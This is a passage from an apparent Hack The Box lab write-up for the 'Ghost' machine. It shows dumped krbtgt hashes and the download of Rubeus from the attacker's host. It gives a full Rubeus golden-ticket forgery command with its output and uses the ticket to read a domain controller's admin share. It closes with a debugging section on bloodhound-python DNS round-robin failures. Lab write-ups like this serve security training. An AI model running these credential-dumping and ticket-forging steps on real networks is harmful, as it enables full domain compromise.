    ntlm- 0: 69eb46aa347a8c68edb99be2725403ab
    lm  - 0: fceff261045c75c4d7f6895de975f6cb

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4acd753922f1e79069fd95d67874be4c
* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.GHOST.HTBkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d
      aes128_hmac       (4096) : ea18711cfd69feef0c8efba75bca9235
      des_cbc_md5       (4096) : b3e070025110ce1f
* Primary:Kerberos *
    Default Salt : CORP.GHOST.HTBkrbtgt
    Credentials
      des_cbc_md5       : b3e070025110ce1f
* Packages *
    NTLM-Strong-NTOWF
* Primary:WDigest *
    01  673e591f1e8395d5bf9069b7ddd084d6
    02  1344e8aade9169b015f2ca4ddf8a04bd
    03  021a6b424b5372ef3511673b04647862
    04  673e591f1e8395d5bf9069b7ddd084d6
    05  1344e8aade9169b015f2ca4ddf8a04bd
    06  122def4643832d604a97c9c02e29cb38
    07  673e591f1e8395d5bf9069b7ddd084d6
    08  2526b041b761a9ae973e69ee23d8ab97
    09  2526b041b761a9ae973e69ee23d8ab97
    10  43c410fd94dc2ca31c3d12cd76ea5e5c
    11  b51d328dbb94b922331d54ffd54134d5
    12  2526b041b761a9ae973e69ee23d8ab97
    13  99c658551700bb8b4dbe0503acade3cb
    14  b51d328dbb94b922331d54ffd54134d5
    15  8a1e17a5a2aa32b2120a39ba99881020
    16  8a1e17a5a2aa32b2120a39ba99881020
    17  9ebecd6b439ee2e7847819e54be70d8f
    18  ff83c6eb25c8da26d5332aeeaeae4cb8
    19  2ee6795b19f71e9c5aa2ab2f902a0c55
    20  3722d9593e0e483720a657bcb56526b2
    21  7bdac8f5dfed431bc7232ff1ca6ebb4d
    22  7bdac8f5dfed431bc7232ff1ca6ebb4d
    23  42b46cd4462f0d4c4ae5da7757a2ff90
    24  7648ab0ac431ceada83b321ca468fccf
    25  7648ab0ac431ceada83b321ca468fccf
    26  7af11e3e17a21afd61955ed5a5f52405
    27  9dfbb554b398bdf2e8c51e1b20208c08
    28  49a35ae4b703b7c47b44708fa235c581
    29  8a24eb5a1a3155556064b79149b00211

mimikatz(commandline) # exit
Bye!

```

Just like above, because I don’t have an interactive shell, I’ll need to enter my commands in the command line. If I hadn’t already disabled Defender, I would need to do it here as well.

#### Craft Golden Ticket

I’ll use [Rubeus](https://github.com/GhostPack/Rubeus) to make a Golden Ticket on Ghost by uploading it:

```

PS C:\programdata> wget 10.10.14.6/Rubeus.exe -outfile r.exe

```

Now I’ll pass it the following options:
- `/aes256 <aes256_hmac>` - The AES key from mimikatz.
- `/ldap` - Use LDAP.
- `/user:Administrator` - The user to use.
- `/sids:<Enterprise Admins for Ghost.htb>` - The group to add to get access in other domain.
- `/ptt` - Prints the ticket to the screen.

It works:

```

PS C:\programdata> .\r.exe golden /aes256:b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d /ldap /user:Administrator /sids:S-1-5-21-4084500788-938703357-3654145966-519 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Build TGT

[*] Trying to query LDAP using LDAPS for user information on domain controller PRIMARY.corp.ghost.htb
[X] Error binding to LDAP server: The LDAP server is unavailable.
[!] LDAPS failed, retrying with plaintext LDAP.
[*] Searching path 'LDAP://PRIMARY.corp.ghost.htb/DC=corp,DC=ghost,DC=htb' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller PRIMARY.corp.ghost.htb
[*] Searching path 'LDAP://PRIMARY.corp.ghost.htb/DC=corp,DC=ghost,DC=htb' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=corp,DC=ghost,DC=htb)(distinguishedname=CN=Domain Admins,CN=Users,DC=corp,DC=ghost,DC=htb)(distinguishedname=CN=Administrators,CN=Builtin,DC=corp,DC=ghost,DC=htb)(objectsid=S-1-5-21-2034262909-2733679486-179904498-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\primary.corp.ghost.htb\SYSVOL
[*] \\primary.corp.ghost.htb\SYSVOL successfully mounted
[*] Attempting to unmount: \\primary.corp.ghost.htb\SYSVOL
[*] \\primary.corp.ghost.htb\SYSVOL successfully unmounted
[*] Retrieving netbios name information over LDAP from domain controller PRIMARY.corp.ghost.htb
[*] Searching path 'LDAP://PRIMARY.corp.ghost.htb/CN=Configuration,DC=ghost,DC=htb' for '(&(netbiosname=*)(dnsroot=corp.ghost.htb))'
[*] Building PAC

[*] Domain         : CORP.GHOST.HTB (GHOST-CORP)
[*] SID            : S-1-5-21-2034262909-2733679486-179904498
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : S-1-5-21-4084500788-938703357-3654145966-519
[*] ServiceKey     : B0EB79F35055AF9D61BCBBE8CCAE81D98CF63215045F7216FFD1F8E009A75E8D
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : B0EB79F35055AF9D61BCBBE8CCAE81D98CF63215045F7216FFD1F8E009A75E8D
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : corp.ghost.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@corp.ghost.htb'

[*] AuthTime       : 3/31/2025 3:02:25 PM
[*] StartTime      : 3/31/2025 3:02:25 PM
[*] EndTime        : 4/1/2025 1:02:25 AM
[*] RenewTill      : 4/7/2025 3:02:25 PM

[*] base64(ticket.kirbi):

      doIF1TCCBdGgAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRAbDkNPUlAuR0hPU1QuSFRCoiMw
      IaADAgECoRowGBsGa3JidGd0Gw5jb3JwLmdob3N0Lmh0YqOCBG4wggRqoAMCARKhAwIBA6KCBFwEggRY
      OA4n5cb0z5dI2lBu5b0njApYj9Fz8gmZAfHgnRvCcl2A8w78e/v1M99Wi56A+BXLQnaE/W3UgOt/oJ/o
      Bm+TnaL9ZM/Dq8JFqqFdBcaOM5QPsaB6dFnINUVjQjeQxhOLpMa+hpBj5yVyFjoZ9vpnqJ+ZQzRJtRAh
      wkdOkT1Mq9KDV0Rl0UGCO3Fjhsc87QIOMlRfpYDVZc9FuQIAn3ydKAI/XFQmy4dDsrARWxUoyDfj1J6Q
      bIgukbPvuRtvczIqY1ZFrcjrP3QsWtpVrHGpSgsEIhuuPtoHB9GA2lvTKg/V3nJ9y8u0BS0E1voQ8sma
      cgOGDGlz41bZRbbH55IFBIkmwOF1CzHE99i5lrTtfgNMTpD2NY8+6CLx8Pd2Ov3K8rxyy1G5+DZwk3bk
      C7rxPJb+a5HH6pkEF5ysfK1Ti7W0ZQapgiRfNfseeqPFSq4hi2fkOC4Qr0dHZD22aqySZfe14+jUPGFn
      YdObh3u+dRduIE8x2y9U5W0MmS0yZGIAp0oN0oLdGEydS5ycvGmEx47R57OtMNIo9Bbz2EycIK89rW8y
      rIw2XjuYIX79he5wyIBDsdKza0eqacrdN7ipMuRU4Cb8tnHAnZToyamavbhRFXmHO2VHCesEo5WnxlM2
      8zghyajs2Vf1omhkLIe+TzpV/h1eQgG7zTKanuWuda9trcrgXfF8+Pd2lf+uur13nVMf6n47RB9DIC6t
      EreRJJYfyw3l3dIWUd3ZCnT/e0i7mgf2b5GNfjmKQRAvuYcnOcIJYaK9TCfNjnpMZxj2D8t2Dp2DJd+k
      vXBDuIF7pFaZJK9gTv1+BGfCPMzZoK6qirQZYR19aZ5uDo52NHkJmlVPO0TewYNMQQMvQaWooYcc/m7m
      +PDyUjkL62eZIJ1WOuc0Z4DAWJwUOVo0sgeTB66iR4mcv6vvxjjv4V/z/q/udA20S/LMDn9bclxg8KSv
      YCOu0zym/6pKsWYy1hqwYjwW5GnVjD9MhcY3nT8RDeNdwKds2Qq1ANpYWxtP65u9gM0JndaCS8K4KDZM
      aqw0z+W53kC3jxOyG+bmVdJeeNES2yZmqOrWnVS92vBHXIVJyZliz61NCS6Tmct3i1V9RTzfUU/ooT9y
      Jpqv+mJIHNdHPbCz20plUUwrEkvSAfPr9y+rP7TeKq5BsM3PLNnQ6Cw4uERn2Y7CbLQh8PLd/gbYymBa
      Y1BEifuYh976fzievBZTY7ykFKh0IilROMxzaGRnJJjH1XVOQ5MtD9kSctZtSSKY1uX6nHkSrIHK+dGa
      a7tpQLGywK/LY8KwmreGqcjHFksyVnqjo9mjy8MGBYGYvFkpf6P4gAqdvMm6OP4RNbHTK7HjtRsLJGY7
      TVqfKAXePbXHoeIv+99Qzlznc4fJZl3HvmD5ENdqPggzICChjazsXHmkuo84E+xYqB6SFqs5IAffDfLA
      hVUhnEYgEGwwKYq8QX06M4Upc2jMa23i/dKk4ymDFi+jggEFMIIBAaADAgEAooH5BIH2fYHzMIHwoIHt
      MIHqMIHnoCswKaADAgESoSIEINwf1wBf++uEG14oKh3zUk0fQ3GgpY1ni/2YDO8PMlfHoRAbDkNPUlAu
      R0hPU1QuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI1MDMzMTIy
      MDIyNVqlERgPMjAyNTAzMzEyMjAyMjVaphEYDzIwMjUwNDAxMDgwMjI1WqcRGA8yMDI1MDQwNzIyMDIy
     NVqoEBsOQ09SUC5HSE9TVC5IVEKpIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDmNvcnAuZ2hvc3QuaHRi

[+] Ticket successfully imported!

```

This golden ticket is for `corp.ghost.htb`, but because the `ghost.htb` Enterprise Admins group is also on the ticket, I can use it across the entire forest.

#### Use Ticket

That ticket is imported into my session, so I can directly read the admin shares on the DC:

```

PS C:\programdata> dir \\dc01.ghost.htb\C$\users\administrator\desktop

    Directory: \\dc01.ghost.htb\C$\users\administrator\desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          2/4/2024   2:03 PM             32 root.txt 
PS C:\programdata> type \\dc01.ghost.htb\C$\users\administrator\desktop\root.txt
ad8eb0da************************

```

## Beyond Root

### Problem

When I [ran Boodhound-python](#enumeration) to collect Bloodhound data, it just worked for me and I continued. Later, Ippsec pinged me to ask if I had any trouble. We compared commands, it they were the same. His didn’t work. Mine did. And then, after a while, his started working again. After a while, mine stopped.

Some times command works, and sometimes it hangs for a minute or so and then crashes:

```

oxdf@hacky$ KRB5CCNAME=florence.ramirez.krb5cc bloodhound-python -c all -k -no-pass -d ghost.htb -u florence.ramirez --use-ldaps -d ghost.htb -ns 10.10.11.24 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ghost.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.ghost.htb
CRITICAL: Kerberos auth to LDAP failed, no authentication methods left
Traceback (most recent call last):
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/authentication.py", line 143, in getLDAPConnection
    bound = self.ldap_kerberos(conn, hostname)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/authentication.py", line 190, in ldap_kerberos
    tgs, cipher, _, sessionkey = getKerberosTGS(servername, self.domain, self.kdc,
                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/impacket/krb5/kerberosv5.py", line 444, in getKerberosTGS
    r = sendReceive(message, domain, kdcHost)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/impacket/krb5/kerberosv5.py", line 91, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_TKT_EXPIRED(Ticket expired)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/oxdf/.local/bin/bloodhound-python", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/__init__.py", line 347, in main
    bloodhound.run(collect=collect,
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/__init__.py", line 78, in run
    self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect, cache_computers=do_computer_enum)
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/domain.py", line 576, in prefetch_info
    self.get_objecttype()
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/domain.py", line 259, in get_objecttype
    self.ldap_connect()
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/domain.py", line 70, in ldap_connect
    ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip,
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/authentication.py", line 152, in getLDAPConnection
    raise CollectionException('Could not authenticate to LDAP. Check your credentials and LDAP server requirements.')
bloodhound.ad.utils.CollectionException: Could not authenticate to LDAP. Check your credentials and LDAP server requirements.

```

### It’s Always DNS

#### Wireshark

I’ll open Wireshark and run again. Luckily for me it hangs, and I capture this:

![image-20250401213652925](/img/image-20250401213652925.png)

The DNS request for `dc01.ghost.htb` returns two IPs, 10.10.11.24 and 10.0.0.254. 10.10.11.24 is the IP I can reach, and 10.0.0.254 is the internal IP used by the VMs.

Immediately after getting that DNS response, it tries to connect to TCP 636 (LDAPS) on 10.0.0.254. And tries. And tries. And then gives up.

#### Dig

DNS servers typically use a “round robin” rotation in how they return IPs, rotating the order from request to request. For example:

```

oxdf@hacky$ for i in {1..10}; do dig dc01.ghost.htb @10.10.11.24 +short | tr '\n' ',' | sed 's/,$/\n/'; done
10.10.11.24,10.0.0.254
10.0.0.254,10.10.11.24
10.10.11.24,10.0.0.254
10.0.0.254,10.10.11.24
10.10.11.24,10.0.0.254
10.0.0.254,10.10.11.24
10.10.11.24,10.0.0.254
10.0.0.254,10.10.11.24
10.10.11.24,10.0.0.254
10.0.0.254,10.10.11.24

```

### Source

#### Locate

I’ve installed bloodhound-python with `pipx`, which puts a stub into my `~/.local/bin` directory so I can call it directly:

```

oxdf@hacky$ which bloodhound-python 
/home/oxdf/.local/bin/bloodhound-python

```

I can find the source by looking at the stub:

```

#!/home/oxdf/.local/share/pipx/venvs/bloodhound/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bloodhound import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())

```

The top line gives the location of the virtual environment that `pipx` is using for this application.

I’ll find the bloodhound-python files there:

```

oxdf@hacky$ ls
ad  enumeration  __init__.py  lib  __main__.py  __pycache__

```

#### Find Issue

The crash dump above has these last two lines showing where the crash happens:

```

  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/domain.py", line 259, in get_objecttype
    self.ldap_connect()
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/domain.py", line 70, in ldap_connect
    ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip,
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/authentication.py", line 152, in getLDAPConnection

```

It’s in the `getLDAPConnection` function in `ad/authentication.py`. That is called from `get_objecttype` in `ad/domain.py`.

`getLDAPConnection` has the following signature:

```

    def getLDAPConnection(self, hostname='', ip='', baseDN='', protocol='ldaps', gc=False):

```

I’ll add a breakpoint just under that and run again:

```

oxdf@hacky$ KRB5CCNAME=florence.ramirez.krb5cc bloodhound-python -c all -k -no-pass -d ghost.htb -u florence.ramirez --use-ldaps -d ghost.htb -ns 10.10.11.24 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ghost.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.ghost.htb
> /home/oxdf/.local/share/pipx/venvs/bloodhound/lib/python3.12/site-packages/bloodhound/ad/authentication.py(90)getLDAPConnection()
-> if gc:
(Pdb) ip
'10.10.11.24'

```

The `ip` variable is already set at this point. I’ll remove that breakpoint and open `domain.py` to see where this is called, finding this code:

```

        # Convert the hostname to an IP, this prevents ldap3 from doing it
        # which doesn't use our custom nameservers
        q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)
        for r in q:
            ip = r.address
        ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip,
                                              baseDN=self.ad.baseDN, protocol=protocol)

```

`self.ad.dnsresolver` is a `dns.resolver.Resolver` [object](https://dnspython.readthedocs.io/en/latest/resolver-class.html#the-dns-resolver-resolver-and-dns-resolver-answer-classes), which does not use the `hosts` file. It’s looping over the results from the DNS query and whatever is last is what is set.

### Repeated Failures / Successes

I think that `bloodhound-python` actually makes the DNS query twice before failing (or at least trigger something else to make a query). So running it, failing, and running again will lead to the same unreachable IP each time.

I can prove this by running the command and it works or times out. Then I’ll run `dig dc01.ghost.htb @10.10.11.24 +short`, which will query the DNS, and rotate the results. The next `bloodhound-python` run will do the opposite of the first.